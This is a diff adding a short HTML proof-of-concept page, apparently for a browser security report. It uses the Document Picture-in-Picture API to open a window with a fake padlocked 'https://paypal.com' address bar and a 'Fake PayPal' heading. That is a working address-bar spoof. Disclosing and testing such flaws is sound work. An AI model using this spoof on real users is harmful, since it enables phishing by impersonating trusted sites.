@@ -1,1 +1,35 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC B - PiP Spoof</title>
+</head>
+<body>
+
+<h2>Document PiP Spoof</h2>
+<button onclick="run()">Run</button>
+
+<script>
+async function run() {
+  if (!("documentPictureInPicture" in window)) {
+    alert("Not supported");
+    return;
+  }
+
+  const pip = await documentPictureInPicture.requestWindow({
+    width: 400,
+    height: 600
+  });
+
+  pip.document.write(`
+    <div style="background:#202124;color:#fff;padding:10px;">
+      🔒 https://paypal.com
+    </div>
+    <h1 style="text-align:center;">Fake PayPal</h1>
+  `);
+}
+</script>
+
+</body>
+</html>
